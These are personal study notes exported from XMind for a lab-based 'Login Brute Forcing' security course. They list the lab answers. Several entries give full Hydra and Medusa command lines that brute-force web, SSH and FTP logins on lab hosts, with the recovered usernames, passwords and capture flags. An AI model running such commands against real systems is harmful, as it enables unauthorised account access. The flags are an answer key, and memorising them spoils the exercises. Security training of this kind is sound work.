---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Login Brute Forcing"
output_topics: 14
---

# Login Brute Forcing — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> Correct PIN found: 9434
> Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
>
> **Source path:** Login Brute Forcing → Password Security Fundamentals → Cracking the PIN → LAB → After successfully brute-forcing the PIN, what is the full flag the script returns? → use the python script (the IP and Port for the target) → Correct PIN found: 9434 Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ec45a3b7-6078-4eda-a9e3-9193f8ab152e -->

> [!output]+ 🟨 Output 002
> Correct password found: gateway
> Flag: HTB{Brut3_F0rc3_M4st3r}
>
> **Source path:** Login Brute Forcing → Dictionary Attacks → LAB → dictionary-solver.py → python3 dictionary-solver.py → Correct password found: gateway Flag: HTB{Brut3_F0rc3_M4st3r}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: aa88f79c-ec74-4c83-9c6f-8b9a2716a4b3 -->

> [!output]+ 🟨 Output 003
> 89 darkweb2017-number.txt
>
> **Source path:** Login Brute Forcing → Hybrid Attacks → scenario → wc -l darkweb2017-number.txt → 89 darkweb2017-number.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a2676682-ffa6-4f11-b4c1-f5d57f7474ce -->

> [!output]+ 🟨 Output 004
> host: 83.136.249.164   login: admin   password: zxcvbnm
>
> **Source path:** Login Brute Forcing → Login Forms → Constructing the params String for Hydra → hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt \ 83.136.249.164 -s 45017 http-post-form \ "/:username=^USER^&amp;password=^PASS^:F=Invalid credentials" → host: 83.136.249.164   login: admin   password: zxcvbnm
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a0771be8-81bf-4245-96dd-8889f7b8a55f -->

> [!output]+ 🟨 Output 005
> ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t
>
> **Source path:** Login Brute Forcing → Web Services → SSH → medusa -h &lt;IP&gt; -n &lt;PORT&gt; -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3 → ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ecfe37f0-74fa-4ab8-bb12-53aaffd6c651 -->

> [!output]+ 🟨 Output 006
> &gt; First Name: Jane
> &gt; Surname: Smith
> &gt; Nickname: Janey
> &gt; Birthdate (DDMMYYYY): 11121990
> ...
>
> **Source path:** Login Brute Forcing → Custom Wordlists → CUPP → (Common User Passwords Profiler) → install → sudo apt install cupp -y → cupp -i → &gt; First Name: Jane &gt; Surname: Smith &gt; Nickname: Janey &gt; Birthdate (DDMMYYYY): 11121990 ...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2e37c1cb-540d-4b75-b0f6-4a3f958552e1 -->

> [!output]+ 🟨 Output 007
> host: 94.237.61.52   login: jane   password: 3n4J!!
>
> **Source path:** Login Brute Forcing → Custom Wordlists → LAB → generate username list → Use the two generated lists in Hydra → hydra -L jsmith-users.txt -P jane-pass-filtered.txt 94.237.61.52 -s 46380 -f http-post-form "/:username=^USER^&amp;password=^PASS^:Invalid credentials" → host: 94.237.61.52   login: jane   password: 3n4J!!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 79a81449-bbfb-48c9-9bb2-942c2a0a105d -->

> [!output]+ 🟨 Output 008
> HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
>
> **Source path:** Login Brute Forcing → Custom Wordlists → LAB → generate username list → Use the two generated lists in Hydra → hydra -L jsmith-users.txt -P jane-pass-filtered.txt 94.237.61.52 -s 46380 -f http-post-form "/:username=^USER^&amp;password=^PASS^:Invalid credentials" → host: 94.237.61.52   login: jane   password: 3n4J!! → HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f33e21f3-ca9d-4e3c-8005-9d4fb0b12398 -->

> [!output]+ 🟨 Output 009
> host: 94.237.120.74   login: admin   password: Admin123
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 1 → What is the password for the basic auth login? → use hydra → hydra -L users.txt -P 2023.txt 94.237.120.74 -s 38110 http-get → host: 94.237.120.74   login: admin   password: Admin123
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e722b17f-d592-47d5-9882-deccb9090fcd -->

> [!output]+ 🟨 Output 010
> satwossh
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 1 → After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment? → login with the credentials → satwossh
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3fe6438b-fa92-49b9-bcb3-45c96462362d -->

> [!output]+ 🟨 Output 011
> User: satwossh Password: password1 [SUCCESS]
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 2 → What is the username of the ftp user you find via brute-forcing? → brute force SSH → medusa -h 94.237.121.111 -n 33926 -u satwossh -P 2023.txt -M ssh -t 5 → User: satwossh Password: password1 [SUCCESS]
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ef8cc145-2e2a-4ee4-bc19-c472127ca4fd -->

> [!output]+ 🟨 Output 012
> Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.
>
> All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
>
> Security Operations Team
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 2 → What is the username of the ftp user you find via brute-forcing? → login with ssh → password list is ready → cat IncedintReport.txt → Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.  All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.  Security Operations Team
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 846615c2-aae8-4bab-964f-3aef21fe94f9 -->

> [!output]+ 🟨 Output 013
> User: thomas Password: chocolate! [SUCCESS]
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 2 → What is the username of the ftp user you find via brute-forcing? → login with ssh → ./username-anarchy Thomas Smith &gt; Thomas-users.txt → medusa -h 127.0.0.1 -U Thomas-users.txt -P passwords.txt -M ftp -t5 → User: thomas Password: chocolate! [SUCCESS]
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8b283f2f-e58f-424e-91a8-6a3eca72021d -->

> [!output]+ 🟨 Output 014
> HTB{brut3f0rc1ng_succ3ssful}
>
> **Source path:** Login Brute Forcing → Skill Assessment → Part 2 → What is the flag contained within flag.txt → ftp thomas@127.0.0.1 → get flag.txt → HTB{brut3f0rc1ng_succ3ssful}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f99fbb0f-f969-491d-b26d-7d3f111b1e98 -->
